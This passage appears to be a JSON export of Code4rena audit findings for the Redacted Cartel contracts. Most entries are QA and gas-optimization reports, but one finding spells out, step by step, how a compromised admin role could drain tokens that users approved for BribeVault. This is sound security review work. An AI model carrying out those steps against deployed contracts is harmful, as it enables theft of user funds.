\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L296\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L297\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L337\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/ThecosomataETH.sol#L146\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/ThecosomataETH.sol#L164\n\n\n\n### Suggested Fix:\nConsider the use of safeTransfer instead of transfer that auto asserts and handles in case of transfer failure.  \n\n\n## QA - 2\n\n### Title: \nUnused return in approve call\n\n### Description:\nThe contract was found to be making an external call (approve). The function which is called is returning some value which is never used. This may lead to discrepancies and improper assumptions in the calling function.\n\n### PoC:\n- Go to the lines below and we will notice that the approve function's return value is not used for any further validation or check.\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/ThecosomataETH.sol#L68\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/ThecosomataETH.sol#L69\n\n### Suggested Fix:\nIt is recommended to make use of the return values coming from the external function that is called to make sure that the calculations following the external call are correct.\n\n\n\n## QA - 3\n\n### Title: \nUse of Floating Pragma Version\n\n### Description:\nThe contract was found to be using a floating pragma which is not considered safe as it can be compiled with all the versions described.\n\n### PoC:\nPragma version^0.8.0 (https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L2) \nPragma version^0.8.0 (https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/RewardDistributor.sol#L2)\nPragma version^0.8.0 (https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/ThecosomataETH.sol#L2) \nPragma version^0.8.0 (https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/TokemakBribe.sol#L2) \n\n### Suggested Fix:\nUse strict pragma version like \nPragma version 0.8.0\n\n## QA - 4\n\n### Title: \nMissing input validation in setFee function \n\n### Description:\nThe function `setFee` does not check if the fee value is set to zero. \n\n## Impact\nAn admin can set fee value to zero by mistake, and it can cause free trades and loss to the organization. \n\n### PoC:\n- Notice the function below https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L108-L113\n- The `setFee` function just checks if the fee is less than feeDivisor but does not check if the fee is zero. \n\n### Suggested Fix:\nCheck if the fee is being set to zero. \n\n\n## Non-critical findings\n\n## QA - 5\n\n### Title: \nUse of Large Number Literals\n\n### Description:\nInteger literals are formed from a sequence of digits in the range 0-9. They are interpreted as decimals. The use of very large numbers with too many digits was detected in the code that could have been optimized using a different notation also supported by Solidity. \n\n## Impact \nLiterals with many digits are difficult to read and review. This may also introduce errors in the future if one of the zeroes is omitted while doing code modifications. \n\n### PoC:\n- Go to https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/BribeVault.sol#L26\nWe will notice a large literal \n`uint256 public constant feeDivisor = 1000000;`\nwhere 1000000 can be represnted as 10e6\n\n### Suggested Fix:\nScientific notation in the form of `2e10` is also supported, where the mantissa can be fractional but the exponent has to be an integer. The literal `MeE` is equivalent to `M * 10**E`. Examples include `2e10`, `2e10`, `2e-10`, `2.5e1`.\n\nReference: [https://docs.soliditylang.org/en/latest/types.html#rational-and-integer-literals](https://docs.soliditylang.org/en/latest/types.html#rational-and-integer-literals)\n\n## QA - 6\n\n### Title: \nMultiple missing events in critical functions\n\n### Description:\nEvents are inheritable members of contracts. When you call them, they cause the arguments to be stored in the transaction's log, a special data structure in the blockchain. These logs are associated with the address of the contract, which can then be used by developers and auditors to keep track of the transactions. \n\nThe contract was found to be missing these events on certain critical functions, which would make it difficult or impossible to track these transactions off-chain.\n\n## Impact \nEvents are used to track the transactions off-chain, and missing these events on critical functions makes it difficult to audit these logs if they're needed at a later stage.  \n\n### PoC:\nThe below functions are missing events.\n- https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/ThecosomataETH.sol#L76-L80\nThe function `setSlippage` is called by an admin and hence should have an event log regarding the change is slippage value.\n\n- https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/ThecosomataETH.sol#L158-L165\nThe `withdraw` function is called by an admin to withdraw funds and hence should have an event log. \n\n- https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/TokemakBribe.sol#L108-L110\nThe function `setRound` sets a new voting round by admins and hence should have an event log. \n\n### Suggested Fix:\nConsider emitting events for the functions mentioned above. It is also recommended to have the addresses indexed. \n\n## QA - 7\n\n### Title: \nMultiple functions Lacking Zero address checks\n\n### Description:\nAddress type parameters should include a zero-address check; otherwise, contract functionality may become inaccessible, or tokens burned forever.\n\n## Impact\nTokens may become inaccessible or burnt forever without a zero-address check.\n\n### PoC:\nBelow is the list of functions lacking zero address checks\n- https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/TokemakBribe.sol#L212-L251\nFunction `depositBribeERC20` has address `proposal` that is missing zero address checks\n\n- https://github.com/code-423n4/2022-02-redacted-cartel/blob/main/contracts/TokemakBribe.sol#L257-L290\nFunction `depositBribe` has address input `proposal`, which is lacking zero address checks. \n\n\n### Suggested Fix:\nAddress zero address check to all the missing places. \n\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-redacted-cartel-findings",
      "repo": "https://github.com/code-423n4/2022-02-redacted-cartel-findings",
      "url": "https://github.com/code-423n4/2022-02-redacted-cartel-findings/issues/97"
    }
  },
  {
    "title": "[WP-H0] `DEFAULT_ADMIN_ROLE` of `BribeVault` can steal tokens from users' wallets",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L80-L88\n\n\n# Vulnerability details\n\nThe current design/implementation allows the `DEFAULT_ADMIN_ROLE` of `BribeVault` to steal funds from any address that approved this contract up to allowance:\n\nAs a `DEFAULT_ADMIN_ROLE`, the attack is simply do the following steps:\n\n    1. `grantDepositorRole()` to self;\n    2. `BribeVault#depositBribeERC20()` and transfer funds from victim's wallet;\n    3. `emergencyWithdrawERC20()`.\n\nThis can be effectively used as a backdoor/attack vector for a malicious/compromised wallet with `DEFAULT_ADMIN_ROLE` of `BribeVault` to steal all the tokens from users' wallets for these users who have approved `BribeVault`.\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L164-L187\n\n```solidity\nfunction depositBribeERC20(\n    bytes32 bribeIdentifier,\n    bytes32 rewardIdentifier,\n    address token,\n    uint256 amount,\n    address briber\n) external onlyRole(DEPOSITOR_ROLE) {\n    require(bribeIdentifier.length > 0, \"Invalid bribeIdentifier\");\n    require(rewardIdentifier.length > 0, \"Invalid rewardIdentifier\");\n    require(token != address(0), \"Invalid token\");\n    require(amount > 0, \"Amount must be greater than 0\");\n    require(briber != address(0), \"Invalid briber\");\n\n    Bribe storage b = bribes[bribeIdentifier];\n    address currentToken = b.token;\n    require(\n        // If bribers want to bribe with a different token they need a new identifier\n        currentToken == address(0) || currentToken == token,\n        \"Cannot change token\"\n    );\n\n    // Since this method is called by a depositor contract, we must transfer from the account\n    // that called the depositor contract - amount must be approved beforehand\n    IERC20(token).safeTransferFrom(briber, address(this), amount);\n    ...\n```\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L80-L88\n\n```solidity\nfunction grantDepositorRole(address depositor)\n    external\n    onlyRole(DEFAULT_ADMIN_ROLE)\n{\n    require(depositor != address(0), \"Invalid depositor\");\n    _grantRole(DEPOSITOR_ROLE, depositor);\n\n    emit GrantDepositorRole(depositor);\n}\n```\n\n## PoC\n\nGiven:\n\n- Alice (the victim) has approved `BribeVault` to spend `WBTC`;\n- Alice has `100e8 WBTC` in their wallet balance.\n\nA malicious/compromised `DEFAULT_ADMIN_ROLE` of `BribeVault` can do the following to steal tokens from users' wallets.\n\n1. `grantDepositorRole()` to self; \n2. `depositBribeERC20()` with: `token` = `WBTC`, `amount` = `100e8`, and `briber` = Alice;\n3. `emergencyWithdrawERC20()` with:  `token` = `WBTC`, `amount` = `100e8`.\n\nAs a result, the `100e8 WBTC` belongs Alice is now stolen by the Hacker.\n\nThe steps above can be repeated for all tokens and users, effectively stealing all the token balances from all the wallets that approved `BribeVault` up to the allowance limit, which usually is unlimited.\n\n## Recommendation\n\n1. Consider using `TokemakBribe` instead of `BribeVault` to hold users' allowances;\n2. Consider making sure that the `from` parameter of `transferFrom` can only be `msg.sender`;\n3. Consider using a multi-sig for the `DEFAULT_ADMIN_ROLE` of `BribeVault`.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-redacted-cartel-findings",
      "repo": "https://github.com/code-423n4/2022-02-redacted-cartel-findings",
      "url": "https://github.com/code-423n4/2022-02-redacted-cartel-findings/issues/86"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "- [S]: Suggested optimation, save a decent amount of gas without compromising readability;\n- [M]: Minor optimation, the amount of gas saved is minor, change when you see fit;\n- [N]: Non-preferred, the amount of gas saved is at cost of readability, only apply when gas saving is a top priority.\n\n## [M] Adding unchecked directive can save gas\n\nFor the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n\nFor example:\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/ThecosomataETH.sol#L118-L118\n\n## [S] Using immutable variable can save gas\n \nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/TokemakBribe.sol#L28-L28\n\n```solidity\n    address public bribeVault;\n```\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/TokemakBribe.sol#L60-L65\n\n```solidity\n    constructor(address _bribeVault) {\n        require(_bribeVault != address(0), \"Invalid bribeVault\");\n        bribeVault = _bribeVault;\n\n        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);\n    }\n```\n\nConsidering that `bribeVault` will never change, changing it to immutable variable instead of storage variable can save gas.\n\n## [S] Remove redundant access control checks can save gas\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/TokemakBribe.sol#L125-L135\n\n```solidity\n    function setProposal(address proposal, uint256 deadline)\n        public\n        onlyAuthorized\n    {\n        require(proposal != address(0), \"Invalid proposal\");\n        require(deadline >= block.timestamp, \"Deadline must be in the future\");\n\n        proposalDeadlines[proposal] = deadline;\n\n        emit SetProposal(proposal, deadline, _round);\n    }\n```\n\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/TokemakBribe.sol#L142-L157\n\n```solidity\n    function setProposals(\n        address[] calldata proposals,\n        uint256[] calldata deadlines\n    ) external onlyAuthorized {\n        require(proposals.length > 0, \"Need at least 1 proposal\");\n        require(\n            proposals.length == deadlines.length,\n            \"Must be equal # of proposals and deadlines\"\n        );\n\n        for (uint256 i = 0; i < proposals.length; i += 1) {\n            setProposal(proposals[i], deadlines[i]);\n        }\n\n        emit SetProposals(proposals, deadlines, _round);\n    }\n```\n\n\n\n`setProposal()` already got `onlyAuthorized` check, and `setProposals()` will check it again multiple times.\n\nConsider creating `_setProposal()` private function without access control and call it inside the public functions.\n\n### Recommendation\n\nChange to:\n\n```solidity\n    function _setProposal(address proposal, uint256 deadline)\n        private\n    {\n        require(proposal != address(0), \"Invalid proposal\");\n        require(deadline >= block.timestamp, \"Deadline must be in the future\");\n\n        proposalDeadlines[proposal] = deadline;\n    }\n\n    /**\n        @notice Set a single proposal\n        @param  proposal  addresss Proposal address\n        @param  deadline  uint256  Proposal deadline\n     */\n    function setProposal(address proposal, uint256 deadline)\n        public\n        onlyAuthorized\n    {\n        _setProposal(proposal, deadline);\n        emit SetProposal(proposal, deadline, _round);\n    }\n\n    /**\n        @notice Set multiple proposals\n        @param  proposals  address[]  Proposal addresses\n        @param  deadlines  uint256[]  Proposal deadlines\n     */\n    function setProposals(\n        address[] calldata proposals,\n        uint256[] calldata deadlines\n    ) external onlyAuthorized {\n        require(proposals.length > 0, \"Need at least 1 proposal\");\n        require(\n            proposals.length == deadlines.length,\n            \"Must be equal # of proposals and deadlines\"\n        );\n\n        for (uint256 i = 0; i < proposals.length; i += 1) {\n            _setProposal(proposals[i], deadlines[i]);\n        }\n\n        emit SetProposals(proposals, deadlines, _round);\n    }\n```\n\n## [S] Validation can be done earlier to save gas\n\nCheck if `ethLiquidity > 0 && btrflyLiquidity > 0` earlier can avoid unnecessary external call (`IRedactedTreasury(TREASURY).manage(WETH, ethLiquidity);`) when this check failed.\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/ThecosomataETH.sol#L124-L155\n\n```solidity\n    function performUpkeep() external onlyOwner {\n        require(checkUpkeep(), \"Invalid upkeep state\");\n\n        uint256 btrfly = IBTRFLY(BTRFLY).balanceOf(address(this));\n        uint256 ethAmount = calculateAmountRequiredForLP(btrfly, true);\n        uint256 ethCap = IERC20(WETH).balanceOf(TREASURY);\n        uint256 ethLiquidity = ethCap > ethAmount ? ethAmount : ethCap;\n\n        // Use BTRFLY balance if remaining capacity is enough, otherwise, calculate BTRFLY amount\n        uint256 btrflyLiquidity = ethCap > ethAmount\n            ? btrfly\n            : calculateAmountRequiredForLP(ethLiquidity, false);\n\n        IRedactedTreasury(TREASURY).manage(WETH, ethLiquidity);\n\n        // Only complete upkeep only on sufficient amounts\n        require(ethLiquidity > 0 && btrflyLiquidity > 0, \"Insufficient amounts\");\n        // ...\n    }\n```\n\n### Recommendation\n\nChange to:\n\n```solidity\n    function performUpkeep() external onlyOwner {\n        require(checkUpkeep(), \"Invalid upkeep state\");\n\n        uint256 btrfly = IBTRFLY(BTRFLY).balanceOf(address(this));\n        uint256 ethAmount = calculateAmountRequiredForLP(btrfly, true);\n        uint256 ethCap = IERC20(WETH).balanceOf(TREASURY);\n        uint256 ethLiquidity = ethCap > ethAmount ? ethAmount : ethCap;\n\n        // Use BTRFLY balance if remaining capacity is enough, otherwise, calculate BTRFLY amount\n        uint256 btrflyLiquidity = ethCap > ethAmount\n            ? btrfly\n            : calculateAmountRequiredForLP(ethLiquidity, false);\n\n        // Only complete upkeep only on sufficient amounts\n        require(ethLiquidity > 0 && btrflyLiquidity > 0, \"Insufficient amounts\");\n\n        IRedactedTreasury(TREASURY).manage(WETH, ethLiquidity);\n\n        // ...\n    }\n```\n\n## [M] `type(uint256).max` is more gas efficient than `2**256 - 1`\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/ThecosomataETH.sol#L68-L69\n\n## [M] `10e18` is more gas efficient than `10**18`\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/ThecosomataETH.sol#L102-L108\n\n## [S] Cache array length in for loops can save gas\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.\n\nCaching the array length in the stack saves around 3 gas per iteration.\n\nInstances include:\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/TokemakBribe.sol#L147-L152\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L261-L275\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/RewardDistributor.sol#L80-L82\n\n## [S] Avoid unnecessary storage read can save gas\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L213-L248\n\n```solidity\n    function depositBribe(\n        bytes32 bribeIdentifier,\n        bytes32 rewardIdentifier,\n        address briber\n    ) external payable onlyRole(DEPOSITOR_ROLE) {\n        require(bribeIdentifier.length > 0, \"Invalid bribeIdentifier\");\n        require(rewardIdentifier.length > 0, \"Invalid rewardIdentifier\");\n        require(briber != address(0), \"Invalid briber\");\n        require(msg.value > 0, \"Value must be greater than 0\");\n\n        Bribe storage b = bribes[bribeIdentifier];\n        address currentToken = b.token;\n        require(\n            // For native tokens, the token address is set to this contract to prevent\n            // overwriting storage - the address can be anything but address(this) safer\n            currentToken == address(0) || currentToken == address(this),\n            \"Cannot change token\"\n        );\n\n        b.amount += msg.value; // Allow bribers to increase bribe\n\n        // Only set the token address and update the reward-to-bribe mapping if not yet set\n        if (currentToken == address(0)) {\n            b.token = address(this);\n            rewardToBribes[rewardIdentifier].push(bribeIdentifier);\n        }\n\n        emit DepositBribe(\n            bribeIdentifier,\n            rewardIdentifier,\n            b.token,\n            msg.value,\n            b.amount,\n            briber\n        );\n    }\n```\n\nBased on L224~L230, L235~L236, we know that `b.token == address(this)`, therefore at L243 `b.token` can be replaced with `address(this)`.\n\nUse `address(this)` directly can avoid unnecessary storage read of `b.token` and save some gas.\n\n### Recommendation\n\nReplace:\n\n```solidity\nemit DepositBribe(\n    bribeIdentifier,\n    rewardIdentifier,\n    b.token,\n    msg.value,\n    b.amount,\n    briber\n);\n```\n\nwith:\n\n```solidity\nemit DepositBribe(\n    bribeIdentifier,\n    rewardIdentifier,\n    address(this),\n    msg.value,\n    b.amount,\n    briber\n);\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-02-redacted-cartel-findings",
      "repo": "https://github.com/code-423n4/2022-02-redacted-cartel-findings",
      "url": "https://github.com/code-423n4/2022-02-redacted-cartel-findings/issues/84"
    }
  },
  {
    "title": "QA Report",
    "body": "## [L] `bytes32Value.length > 0` is misused, should be `bytes32Value != bytes32(0)` \n\n`bytes32Value.length > 0` is meanless, as it always be `true`, because `.length` yields the fixed length of the byte array. `bytes32Value.length` == 32.\n\n`bytes32` is a value type, you should use `!=` to do the comparison.\n\nSee: https://docs.soliditylang.org/en/v0.8.12/types.html#fixed-size-byte-arrays\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L164-L205\n\n```solidity\n    function depositBribeERC20(\n        bytes32 bribeIdentifier,\n        bytes32 rewardIdentifier,\n        address token,\n        uint256 amount,\n        address briber\n    ) external onlyRole(DEPOSITOR_ROLE) {\n        require(bribeIdentifier.length > 0, \"Invalid bribeIdentifier\");\n        require(rewardIdentifier.length > 0, \"Invalid rewardIdentifier\");\n        // ...\n    }\n```\n\nCan be changed to:\n\n```solidity\n    function depositBribeERC20(\n        bytes32 bribeIdentifier,\n        bytes32 rewardIdentifier,\n        address token,\n        uint256 amount,\n        address briber\n    ) external onlyRole(DEPOSITOR_ROLE) {\n        require(bribeIdentifier.length != bytes32(0), \"Invalid bribeIdentifier\");\n        require(rewardIdentifier.length != bytes32(0), \"Invalid rewardIdentifier\");\n        // ...\n    }\n```\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L213-L248\n\n```solidity\n    function depositBribe(\n        bytes32 bribeIdentifier,\n        bytes32 rewardIdentifier,\n        address briber\n    ) external payable onlyRole(DEPOSITOR_ROLE) {\n        require(bribeIdentifier.length > 0, \"Invalid bribeIdentifier\");\n        require(rewardIdentifier.length > 0, \"Invalid rewardIdentifier\");\n        // ...\n    }\n```\n\nCan be changed to:\n\n```solidity\n    function depositBribe(\n        bytes32 bribeIdentifier,\n        bytes32 rewardIdentifier,\n        address briber\n    ) external payable onlyRole(DEPOSITOR_ROLE) {\n        require(bribeIdentifier.length != bytes32(0), \"Invalid bribeIdentifier\");\n        require(rewardIdentifier.length != bytes32(0), \"Invalid rewardIdentifier\");\n        // ...\n    }\n```\n\n## [L] Unchecked return value for `token.transfer` call\n\nIt is usually good to add a require-statement that checks the return value or to use something like safeTransfer; unless one is sure the given token reverts in case of a failure.\n\nInstances include:\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L296-L297\n\n```solidity\nIERC20(token).transfer(feeRecipient, feeAmount);\nIERC20(token).transfer(distributor, distributorAmount);\n```\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/ThecosomataETH.sol#L146-L146\n\n```solidity\nIERC20(token).transfer(TREASURY, tokenBalance);\n```\n\n### Recommendation\n\nConsider adding a require-statement or using `safeTransfer` of SafeERC20.",
    "dataSource": {
      "name": "code-423n4/2022-02-redacted-cartel-findings",
      "repo": "https://github.com/code-423n4/2022-02-redacted-cartel-findings",
      "url": "https://github.com/code-423n4/2022-02-redacted-cartel-findings/issues/83"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Redacted Cartel Gas Optimization Report\n\nUnless otherwise noted, manual auditing and testing were done using Visual Studio Code and Remix. The sponsor-provided test suite was used to verify the findings. \n\nThe audit was done from February 15-17, 2022 by ye0lde through code4rena.\n\n- [Findings](#findings)\n  - [G-1 - Function `depositBribe` can be more efficient (TokemakBribe.sol)](#g-1---function-depositbribe-can-be-more-efficient-tokemakbribesol)\n  - [G-2 - `checkUpkeep` can be refactored to be more efficient (ThecosomataETH.sol)](#g-2---checkupkeep-can-be-refactored-to-be-more-efficient-thecosomataethsol)\n  - [G-3 - Constant variables can be immutable (TokemakBribe.sol, BribeVault.sol)](#g-3---constant-variables-can-be-immutable-tokemakbribesol-bribevaultsol)\n  - [G-4 - Checking for non-zero transfer values](#g-4---checking-for-non-zero-transfer-values)\n  - [G-5 - Long Revert Strings](#g-5---long-revert-strings)\n\n## Findings  \n\n### G-1 - Function `depositBribe` can be more efficient (TokemakBribe.sol)\n\n#### Impact\nCaching the references to `bribeVault` in the `depositBribe` function will decrease gas usage. \n\nBelow are the relevant numbers from the sponsor's test suite before and after the change:\n\n| Function     | Before (AVG) | After (AVG) | \n| ----------- | ----------- | ----------- |\n| depositBribe     | 136564      | 136221 |\n\n#### Proof of Concept\nThe `depositBribe` function is here:\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/TokemakBribe.sol#L257-L290\n\n```\nfunction depositBribe(address proposal) external payable {\n    uint256 currentRound = _round;\n    require(\n        proposalDeadlines[proposal] > block.timestamp,\n        \"Proposal deadline has passed\"\n    );\n    require(msg.value > 0, \"Bribe amount must be greater than 0\");\n\n    bytes32 bribeIdentifier = generateBribeVaultIdentifier(\n        proposal,\n        currentRound,\n        bribeVault\n    );\n    bytes32 rewardIdentifier = generateRewardIdentifier(\n        currentRound,\n        bribeVault\n    );\n\n    IBribeVault(bribeVault).depositBribe{value: msg.value}(\n        // NOTE: Native token bribes have bribeVault set as the address\n        bribeIdentifier,\n        rewardIdentifier,\n        msg.sender\n    );\n\n    emit DepositBribe(\n        proposal,\n        currentRound,\n        bribeVault,\n        msg.value,\n        bribeIdentifier,\n        rewardIdentifier\n    );\n}\n```\n\n#### Recommended Mitigation Steps\nI suggest the following changes:\n\n```\n    function depositBribe(address proposal) external payable {\n        uint256 currentRound = _round;\n        require(\n            proposalDeadlines[proposal] > block.timestamp,\n            \"Proposal deadline has passed\"\n        );\n        require(msg.value > 0, \"Bribe amount must be greater than 0\"); \n\n        address localBribeVault = bribeVault;\n        bytes32 bribeIdentifier = generateBribeVaultIdentifier(\n            proposal,\n            currentRound,\n            localBribeVault  \n        );\n        bytes32 rewardIdentifier = generateRewardIdentifier(\n            currentRound,\n            localBribeVault\n        );\n\n        IBribeVault(localBribeVault).depositBribe{value: msg.value}(\n            // NOTE: Native token bribes have bribeVault set as the address\n            bribeIdentifier,\n            rewardIdentifier,\n            msg.sender\n        );\n\n        emit DepositBribe(\n            proposal,\n            currentRound,\n            localBribeVault,\n            msg.value,\n            bribeIdentifier,\n            rewardIdentifier\n        );\n    }\n```\n---\n\n### G-2 - `checkUpkeep` can be refactored to be more efficient (ThecosomataETH.sol)\n\n#### Impact\nUnneeded variables and branching can be removed.  In my testing, it saved about 47g on average during execution.  That doesn't include any additional savings from the \"inlining\" mentioned below.\n\n#### Proof of Concept\n`checkUpkeep` is here:\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/ThecosomataETH.sol#L82-L91\n\n```\n// Return whether we should perform an upkeep based on the contract's BTRFLY balance\nfunction checkUpkeep()\n    public\n    view\n    returns (bool upkeepNeeded)\n{\n    if (IBTRFLY(BTRFLY).balanceOf(address(this)) > 0) {\n        return true;\n    }\n}\n```\n\n#### Recommended Mitigation Steps\nI recommend refactoring the function to this:\n\n```\n// Return whether we should perform an upkeep based on the contract's BTRFLY balance\n// returns bool upkeepNeeded\nfunction checkUpkeep()\n    public\n    view\n    returns (bool)\n{\n    return (IBTRFLY(BTRFLY).balanceOf(address(this)) > 0); \n}\n```\n\nIn addition, the only other function that calls `checkUpkeep` could just inline the code.  That could be done here:\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/ThecosomataETH.sol#L124-L127\n\n```\nfunction performUpkeep() external onlyOwner {\n    require(checkUpkeep(), \"Invalid upkeep state\");\n\n\n    uint256 btrfly = IBTRFLY(BTRFLY).balanceOf(address(this));\n```\n\nIt could be changed to:\n\n```\nfunction performUpkeep() external onlyOwner {\n    uint256 btrfly = IBTRFLY(BTRFLY).balanceOf(address(this));\n    require(btrfly > 0, \"Invalid upkeep state\");\n        \n```\n\n---\n\n### G-3 - Constant variables can be immutable (TokemakBribe.sol, BribeVault.sol)\n\n#### Impact\nChanging the variables from constant to immutable will reduce keccak operations and save gas.\n\nBelow are the relevant numbers from the sponsor's test suite before and after the change:\n\n| Function     | Before (AVG) | After (AVG) | \n| ----------- | ----------- | ----------- |\n| BribeVault/depositBribe     | 70320      | 70287 |\n| BribeVault/depositBribeERC20    | 119980      | 119947 |\n| BribeVault/grantDepositorRole     | 49861     | 49828 |\n BribeVault/revokeDepositorRole     | 28268     | 28202|\n | TokemakBribe/depositBribe     | 136564      | 136531 |\n| TokemakBribe/depositBribeERC20    | 167121      | 167088 |\n| TokemakBribe/grantTeamRole     | 49934    | 49901 |\n TokemakBribe/revoketeamRole     | 28252     | 28186|\n\n#### Proof of Concept\nThe variables that can be changed from `constant` to `immutable` are here:\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/TokemakBribe.sol#L40\n`bytes32 public constant TEAM_ROLE = keccak256(\"TEAM_ROLE\");`\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L27\n`bytes32 public constant DEPOSITOR_ROLE = keccak256(\"DEPOSITOR_ROLE\");`\n\n---\n\n### G-4 - Checking for non-zero transfer values\n\n#### Impact\nChecking non-zero transfer values can avoid an external call to save gas. Checking if the amount > 0 before making the external call to transfer can save gas by avoiding the external call.\n\n#### Proof of Concept \nThe transfer's are here:\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L296\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/RewardDistributor.sol#L178-L182\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/ThecosomataETH.sol#L164\n\n#### Recommended Mitigation Steps\nCheck for non-zero transfer value before doing the transfer.\n\n---\n\n### G-5 - Long Revert Strings \n\n#### Impact\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition has been met. Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\n#### Proof of Concept \nRevert strings > 32 bytes are here:\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L265\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L288\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/BribeVault.sol#L294\n\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/TokemakBribe.sol#L149\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/TokemakBribe.sol#L223\nhttps://github.com/code-423n4/2022-02-redacted-cartel/blob/92c4d5810df7b9de15eae55dc7641c8b36cd799d/contracts/TokemakBribe.sol#L263\n\n#### Recommended Mitigation Steps\nConsider shortening the revert strings to fit in 32 bytes or using custom errors in the future.\n\n---\n",
    "dataSource": {
      "name": "code-423n4/2022-02-redacted-cartel-findings",
      "repo": "https://github.com/code-423n4/2022-02-redacted-cartel-findings",
      "url": "https://github.com/code-423n4/2022-02-redacted-cartel-findings/issues/79"
    }
  },
  {
    "title": "QA Report",
